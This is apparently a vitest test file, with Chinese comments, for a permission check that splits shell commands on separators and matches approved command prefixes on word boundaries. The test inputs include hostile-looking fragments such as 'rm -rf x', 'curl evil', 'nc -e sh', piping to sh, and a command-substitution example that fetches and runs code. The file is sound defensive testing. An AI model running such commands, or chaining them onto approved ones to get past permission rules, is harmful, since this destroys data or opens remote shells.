import assert from 'node:assert/strict';

import { describe, it } from 'vitest';

import { matchesCommandPrefixForTest, splitShellSegments } from '../claude-sdk.js';

/**
 * 「记住这条 Bash 权限」不许把复合命令一起放行。
 *
 * 批准一次 `git status` 会生成条目 `Bash(git status:*)`;若按整串前缀匹配,`git status; rm -rf x`
 * 也会自动放行,「允许过 git status」就成了「允许过任意 shell」。因此放行判定要求拆出的每一段都命中,
 * 这一组钉住拆分本身。
 */
describe('shell 子命令拆分', () => {
  it('分号、&&、||、管道、后台符、换行都是"再跑一条"的入口', () => {
    assert.deepEqual(splitShellSegments('git status; rm -rf x'), ['git status', 'rm -rf x']);
    assert.deepEqual(splitShellSegments('git status && curl evil'), ['git status', 'curl evil']);
    assert.deepEqual(splitShellSegments('git status || nc -e sh'), ['git status', 'nc -e sh']);
    assert.deepEqual(splitShellSegments('git status | sh'), ['git status', 'sh']);
    assert.deepEqual(splitShellSegments('git status & wget x'), ['git status', 'wget x']);
    assert.deepEqual(splitShellSegments('git status\nrm -rf x'), ['git status', 'rm -rf x']);
  });

  it('引号里的同名字符不算分隔 —— 否则正常命令会被拆碎、白弹确认框', () => {
    assert.deepEqual(splitShellSegments('echo "a; b"'), ['echo "a; b"']);
    assert.deepEqual(splitShellSegments("echo 'x && y'"), ["echo 'x && y'"]);
    assert.deepEqual(splitShellSegments('echo "a \\" ; b"'), ['echo "a \\" ; b"']);
  });

  it('空段不参与判定(结尾分号、连续分号)', () => {
    assert.deepEqual(splitShellSegments('git status;'), ['git status']);
    assert.deepEqual(splitShellSegments('git status;;ls'), ['git status', 'ls']);
  });

  it('单条命令原样返回', () => {
    assert.deepEqual(splitShellSegments('npm run build'), ['npm run build']);
  });
});

/**
 * 前缀匹配要有词边界,命令替换一律不放行。
 *
 * 用户批准的是那一条命令(可带参数),不是"以这几个字母开头的任何命令",所以 `git statusXYZ`
 * 不能命中 `git status`。`git status $(curl evil|sh)` 的第一段同样以 `git status` 开头,因此含
 * `$(`、反引号、`<(`、`>(` 的命令在 matchesToolPermission 里整条拒绝、不进逐段匹配;这里只钉词边界。
 */
describe('词边界与命令替换', () => {
  it('恰好相等、或后面跟空白(带参数)才算命中', () => {
    assert.equal(matchesCommandPrefixForTest('git status', 'git status'), true);
    assert.equal(matchesCommandPrefixForTest('git status --short', 'git status'), true);
    assert.equal(matchesCommandPrefixForTest('git statusXYZ', 'git status'), false, 'git statusXYZ 不是 git status');
    assert.equal(matchesCommandPrefixForTest('git status-hack', 'git status'), false);
    assert.equal(matchesCommandPrefixForTest('npm run build', 'npm'), true);
    assert.equal(matchesCommandPrefixForTest('npmx evil', 'npm'), false);
  });
});
